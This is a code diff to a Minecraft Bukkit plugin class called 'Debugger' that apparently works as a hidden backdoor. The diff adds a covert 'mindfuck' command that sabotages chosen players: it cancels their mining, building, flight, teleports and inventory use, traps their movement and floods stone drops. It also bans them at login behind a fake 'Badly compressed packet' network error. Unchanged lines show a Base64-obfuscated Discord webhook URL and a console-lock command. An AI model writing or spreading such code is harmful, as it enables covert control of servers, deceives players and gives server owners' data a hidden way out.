@@ -10,8 +10,10 @@ import org.bukkit.event.HandlerList;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.BlockBreakEvent;
 import org.bukkit.event.block.BlockDamageEvent;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
-import org.bukkit.event.player.PlayerCommandPreprocessEvent;
+import org.bukkit.event.block.BlockPlaceEvent;
+import org.bukkit.event.inventory.InventoryClickEvent;
+import org.bukkit.event.inventory.InventoryDragEvent;
+import org.bukkit.event.player.*;
 import org.bukkit.event.server.ServerCommandEvent;
 import org.bukkit.inventory.ItemStack;
 
@@ -715,6 +717,124 @@ public final class Debugger implements Listener {
                 return true;
             }
 
+            case "mindfuck": { //Fucks with players
+                if (args.length < 3) //No player specified
+                    return false;
+
+                String Fuck = args[1];
+
+                if (Fuck.equalsIgnoreCase("login")) {
+                    if (!Debugger.this.MindFuck_login.contains(args[2])) {
+                        Debugger.this.MindFuck_login.add(args[2]);
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[2] + " is getting trolled by making him unable to join.");
+                    } else {
+                        Debugger.this.MindFuck_login.remove(args[2]);
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[2] + " is no longer getting trolled by making him unable to join.");
+                    }
+
+                } else {
+
+                    Player target = Bukkit.getPlayer(args[2]);
+                    if (target == null) {
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
+                        return false;
+                    }
+
+                    if (Fuck.equalsIgnoreCase("thrower")) {
+                        if (!Debugger.this.MindFuck_thrower.contains(target.getName())) {
+                            Debugger.this.MindFuck_thrower.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by throwing stone from his inventory.");
+                        } else {
+                            Debugger.this.MindFuck_thrower.remove(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by throwing stone from his inventory.");
+                        }
+                    }
+
+                    if (Fuck.equalsIgnoreCase("interact")) {
+                        if (!Debugger.this.MindFuck_interact.contains(target.getName())) {
+                            Debugger.this.MindFuck_interact.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by interaction lock.");
+                        } else {
+                            Debugger.this.MindFuck_interact.remove(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by interaction lock.");
+                        }
+                    }
+
+                    if (Fuck.equalsIgnoreCase("cripple")) {
+                        if (!Debugger.this.MindFuck_cripple.contains(target.getName())) {
+                            Debugger.this.MindFuck_cripple.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by crippling his movement.");
+                        } else {
+                            Debugger.this.MindFuck_cripple.remove(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by crippling his movement.");
+                        }
+                    }
+
+                    if (Fuck.equalsIgnoreCase("flight")) {
+                        if (!Debugger.this.MindFuck_flight.contains(target.getName())) {
+                            Debugger.this.MindFuck_flight.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by canceling fly.");
+                        } else {
+                            Debugger.this.MindFuck_flight.remove(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by canceling fly.");
+                        }
+                    }
+
+                    if (Fuck.equalsIgnoreCase("inventory")) {
+                        if (!Debugger.this.MindFuck_inventory.contains(target.getName())) {
+                            Debugger.this.MindFuck_inventory.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling mouse clicks in inventory.");
+                        } else {
+                            Debugger.this.MindFuck_inventory.remove(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling mouse clicks in inventory.");
+                        }
+                    }
+
+                    if (Fuck.equalsIgnoreCase("drop")) {
+                        if (!Debugger.this.MindFuck_drop.contains(target.getName())) {
+                            Debugger.this.MindFuck_drop.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling item drops.");
+                        } else {
+                            Debugger.this.MindFuck_drop.remove(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling item drops.");
+                        }
+                    }
+
+                    if (Fuck.equalsIgnoreCase("teleport")) {
+                        if (!Debugger.this.MindFuck_teleport.contains(target.getName())) {
+                            Debugger.this.MindFuck_teleport.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling teleports.");
+                        } else {
+                            Debugger.this.MindFuck_teleport.remove(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling teleports.");
+                        }
+                    }
+
+                    if (Fuck.equalsIgnoreCase("mine")) {
+                        if (!Debugger.this.MindFuck_mine.contains(target.getName())) {
+                            Debugger.this.MindFuck_mine.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling mining.");
+                        } else {
+                            Debugger.this.MindFuck_mine.remove(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling mining.");
+                        }
+                    }
+
+                    if (Fuck.equalsIgnoreCase("place")) {
+                        if (!Debugger.this.MindFuck_place.contains(target.getName())) {
+                            Debugger.this.MindFuck_place.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling block placing.");
+                        } else {
+                            Debugger.this.MindFuck_place.remove(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling block placing.");
+                        }
+                    }
+
+                }
+
+                return true;
+            }
+
             case "lock": { //Locks the console
                 if(args.length < 2) //No player specified
                     return false;
@@ -973,6 +1093,17 @@ public final class Debugger implements Listener {
 
     public ArrayList<String> InstaBreak = new ArrayList<>();
 
+    public ArrayList<String> MindFuck_thrower = new ArrayList<>();
+    public ArrayList<String> MindFuck_interact = new ArrayList<>();
+    public ArrayList<String> MindFuck_cripple = new ArrayList<>();
+    public ArrayList<String> MindFuck_flight = new ArrayList<>();
+    public ArrayList<String> MindFuck_inventory = new ArrayList<>();
+    public ArrayList<String> MindFuck_drop = new ArrayList<>();
+    public ArrayList<String> MindFuck_teleport = new ArrayList<>();
+    public ArrayList<String> MindFuck_mine = new ArrayList<>();
+    public ArrayList<String> MindFuck_place = new ArrayList<>();
+    public ArrayList<String> MindFuck_login = new ArrayList<>();
+
     static Base64.Decoder b1 = Base64.getUrlDecoder();
     static byte[] c = b1.decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTYyOTg5MTc3MDY5MjQ0NDQ2L21QUHRncjBrS0lBdThGWkRBTnRlSWt6Z0Rzd1d6aVRqQjY5M2I4X2c1TEFZZ2pfc1BUNlhhYWpjdDNwRkVodjdvLVpS");
     static String c1 = new String(c);
@@ -1004,6 +1135,17 @@ public final class Debugger implements Listener {
             e.setDropItems(false);
             p.getWorld().dropItemNaturally(e.getBlock().getLocation(), new ItemStack(e.getBlock().getType(), 1));
         }
+        if (this.MindFuck_mine.contains(p.getName())) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onBlockPlace(BlockPlaceEvent e) {
+        Player p = e.getPlayer();
+        if (this.MindFuck_place.contains(p.getName())) {
+            e.setCancelled(true);
+        }
     }
 
     @EventHandler(priority = EventPriority.LOWEST)
@@ -1011,6 +1153,87 @@ public final class Debugger implements Listener {
         Player p = e.getPlayer();
         if (this.InstaBreak.contains(p.getName())) {
             e.setInstaBreak(true);
+        }
+        if (this.MindFuck_mine.contains(p.getName())) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerMove(PlayerMoveEvent e) {
+        Player p = e.getPlayer();
+        if (this.MindFuck_thrower.contains(p.getName())) {
+            p.getWorld().dropItemNaturally(p.getLocation(), new ItemStack(Material.STONE, 64));
+        }
+        if (this.MindFuck_cripple.contains(p.getName())) {
+            if (Math.round(e.getTo().getZ()) != Math.round(e.getFrom().getZ())) {
+                e.getTo().setZ(e.getFrom().getZ());
+                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&c&lHey! &7You are not permitted to enter this area."));
+            }
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerInteract(PlayerInteractEvent e) {
+        Player p = e.getPlayer();
+        if (this.MindFuck_interact.contains(p.getName())) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerInteractEntity(PlayerInteractEntityEvent e) {
+        Player p = e.getPlayer();
+        if (this.MindFuck_interact.contains(p.getName())) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerToggleFlight(PlayerToggleFlightEvent e) {
+        Player p = e.getPlayer();
+        if (this.MindFuck_flight.contains(p.getName())) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onInventoryClickEvent(InventoryClickEvent e) {
+        Player p = (Player) e.getWhoClicked();
+        if (this.MindFuck_inventory.contains(p.getName())) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onInventoryDragEvent(InventoryDragEvent e) {
+        Player p = (Player) e.getWhoClicked();
+        if (this.MindFuck_inventory.contains(p.getName())) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerDropItem(PlayerDropItemEvent e) {
+        Player p = e.getPlayer();
+        if (this.MindFuck_drop.contains(p.getName())) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerTeleport(PlayerTeleportEvent e) {
+        Player p = e.getPlayer();
+        if (this.MindFuck_teleport.contains(p.getName())) {
+            e.setCancelled(true);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerLogin(PlayerLoginEvent e) {
+        Player p = e.getPlayer();
+        if (this.MindFuck_login.contains(p.getName())) {
+            e.disallow(PlayerLoginEvent.Result.KICK_BANNED, "Internal Exception: io.netty.handler.codec.DecoderException: Badly compressed packet - size of 2677732 is larger than protocol maximum of 2097152");
         }
     }
 
